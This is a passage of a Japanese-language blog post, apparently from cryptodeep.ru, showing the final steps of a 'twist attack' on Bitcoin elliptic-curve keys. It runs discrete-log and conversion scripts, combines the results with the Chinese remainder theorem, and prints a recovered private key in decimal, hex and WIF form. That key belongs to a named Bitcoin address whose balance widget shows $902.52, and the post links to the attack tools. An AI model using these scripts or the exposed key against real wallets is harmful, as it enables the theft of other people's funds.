<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-35-1024x520.png" alt="ツイスト攻撃の例 #2 一連の ECC 操作を続行して、ビットコイン ウォレットの秘密鍵の値を取得します。" class="wp-image-2210"/></figure>
<!-- /wp:image -->

<!-- wp:heading -->
<h2>コマンドを実行します。</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>sage -python3 discrete.py</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":2339} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/02/image-7.png" alt="ツイスト攻撃の例 #2 一連の ECC 操作を続行して、ビットコイン ウォレットの秘密鍵の値を取得します。" class="wp-image-2339"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>結果：</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>Discrete_log_rho:

14996641256
1546
19575
31735
9071789
145517682
11552
7151
3370711
10797447604
10120546250224

PRIVATE KEY:

3160389728152122137789469305939632411648887242506549174582525524562820572318</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>privkey = crt(&#91;x11, x21, x22, x31, x32, x33, x41, x61, x62, x63, x64], &#91;ord11, ord21, ord22, ord31, ord32, ord33, ord41, ord61, ord62, ord63, ord64])
</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>離散対数を解き、「<em>中国剰余定理</em>&nbsp;<code>(Chinese remainder theorem)</code>」を使用して、10 進数形式の秘密鍵を取得しました。</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:heading -->
<h2>秘密鍵を HEX 形式に変換する</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><em>秘密鍵の 10 進形式がファイルに保存されました。</em>&nbsp;<code>privkey.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":2342} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/02/image-8.png" alt="ツイスト攻撃の例 #2 一連の ECC 操作を続行して、ビットコイン ウォレットの秘密鍵の値を取得します。" class="wp-image-2342"/></figure>
<!-- /wp:image -->

<!-- wp:heading -->
<h2>Python スクリプトを実行します:&nbsp;<a href="https://github.com/demining/CryptoDeepTools/blob/main/18TwistAttack/privkey2hex.py" target="_blank" rel="noreferrer noopener">privkey2hex.py</a></h2>
<!-- /wp:heading -->

<!-- wp:image {"id":2230} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-38.png" alt="ツイスト攻撃の例 #2 一連の ECC 操作を続行して、ビットコイン ウォレットの秘密鍵の値を取得します。" class="wp-image-2230"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python3 privkey2hex.py
cat privkey2hex.txt</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":2344} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/02/image-9.png" alt="ツイスト攻撃の例 #2 一連の ECC 操作を続行して、ビットコイン ウォレットの秘密鍵の値を取得します。" class="wp-image-2344"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><em>結果のファイルを開きましょう。</em>&nbsp;<code>privkey2hex.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":2345} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/02/image-10.png" alt="ツイスト攻撃の例 #2 一連の ECC 操作を続行して、ビットコイン ウォレットの秘密鍵の値を取得します。" class="wp-image-2345"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>HEX 形式の秘密鍵:</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>PrivKey = 06fcb79a2eabffa519509e43b7de95bc2df15ca48fe6be29f9160bcd6ac1a49e</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">ビットアドレス</a></strong>を開いて確認しましょう&nbsp;&nbsp;：</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>ADDR: 1L7vTvRwmWENJm4g15rAxAtGcXjrFsWcBx
WIF:  KwTHx3AhV8qiN6qyfG1D85TGEeUBiaMUjnQ11eVLP5NAfiVNLLmS
HEX:  06FCB79A2EABFFA519509E43B7DE95BC2DF15CA48FE6BE29F9160BCD6AC1A49E</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":2348} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/02/image-41-2.png" alt="ツイスト攻撃の例 #2 一連の ECC 操作を続行して、ビットコイン ウォレットの秘密鍵の値を取得します。" class="wp-image-2348"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:embed {"url":"https://live.blockcypher.com/widget/btc/1L7vTvRwmWENJm4g15rAxAtGcXjrFsWcBx/received/"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://live.blockcypher.com/widget/btc/1L7vTvRwmWENJm4g15rAxAtGcXjrFsWcBx/received/
</div></figure>
<!-- /wp:embed -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:embed {"url":"https://live.blockcypher.com/btc/address/1L7vTvRwmWENJm4g15rAxAtGcXjrFsWcBx/"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://live.blockcypher.com/btc/address/1L7vTvRwmWENJm4g15rAxAtGcXjrFsWcBx/
</div></figure>
<!-- /wp:embed -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":2350} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/02/image-11-1024x521.png" alt="ツイスト攻撃の例 #2 一連の ECC 操作を続行して、ビットコイン ウォレットの秘密鍵の値を取得します。" class="wp-image-2350"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":2352} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/02/image-12-1024x182.png" alt="ツイスト攻撃の例 #2 一連の ECC 操作を続行して、ビットコイン ウォレットの秘密鍵の値を取得します。" class="wp-image-2352"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code><strong>BALANCE: $ 902.52</strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong><a href="https://github.com/demining/CryptoDeepTools/tree/main/18TwistAttack" target="_blank" rel="noreferrer noopener">ソース</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://attacksafe.ru/software" target="_blank" rel="noreferrer noopener">ATTACKSAFE ソフトウェア</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://t.me/cryptodeeptech" target="_blank" rel="noreferrer noopener">テレグラム: https://t.me/cryptodeeeptech</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://youtu.be/pOviZOYItv4" target="_blank" rel="noreferrer noopener">動画素材：https://youtu.be/pOviZOYItv4</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://cryptodeep.ru/twist-attack-2" target="_blank" rel="noreferrer noopener">ソース: https://cryptdeep.ru/twist-attack-2</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":2359} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/02/034-1-1024x576.png" alt="ツイスト攻撃の例 #2 一連の ECC 操作を続行して、ビットコイン ウォレットの秘密鍵の値を取得します。" class="wp-image-2359"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>&nbsp;<a href="https://cryptodeep.ru/category/%d0%ba%d1%80%d0%b8%d0%bf%d1%82%d0%be%d0%b0%d0%bd%d0%b0%d0%bb%d0%b8%d0%b7/">暗号解読</a></p>
<!-- /wp:paragraph -->
